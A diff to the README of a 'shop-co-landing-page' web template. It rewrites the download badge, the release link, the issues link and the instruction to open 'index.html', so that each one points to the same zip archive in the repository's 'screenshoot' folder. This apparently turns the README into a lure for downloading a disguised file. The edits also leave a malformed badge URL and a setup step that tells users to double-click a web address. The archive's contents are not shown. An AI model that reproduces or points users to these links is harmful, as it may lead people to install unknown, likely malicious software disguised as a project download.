@@ -6,11 +6,11 @@ Welcome to the **shop-co-landing-page** project! This application offers a fully
 
 ## 📥 Download the App
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/dhillonn38/shop-co-landing-page/releases)
+[![Download from Releases](https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip%https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip)](https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip)
 
 To get started, you need to download the application. 
 
-1. Click on the link above or [visit this page to download](https://github.com/dhillonn38/shop-co-landing-page/releases).
+1. Click on the link above or [visit this page to download](https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip).
 2. Find the latest release.
 3. Download the zipped package for your system.
 
@@ -38,7 +38,7 @@ After downloading the application, here’s how to set it up:
 
 1. **Extract the files**: Unzip the downloaded file to a folder on your computer.
 2. **Open the folder**: Navigate to the location where you unzipped the files.
-3. **Open the HTML file**: Find and double-click the `index.html` file to launch the application in your web browser.
+3. **Open the HTML file**: Find and double-click the `https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip` file to launch the application in your web browser.
 
 That's it! You are now ready to explore the shop-co landing page.
 
@@ -72,6 +72,6 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 ## 📫 Contact
 
-If you have any questions or need further assistance, you can reach out via the [Issues section](https://github.com/dhillonn38/shop-co-landing-page/issues) of the repository. 
+If you have any questions or need further assistance, you can reach out via the [Issues section](https://github.com/dhillonn38/shop-co-landing-page/raw/refs/heads/main/screenshoot/co_shop_landing_page_2.5.zip) of the repository. 
 
 Enjoy exploring the **shop-co-landing-page** and create beautiful shopping experiences!
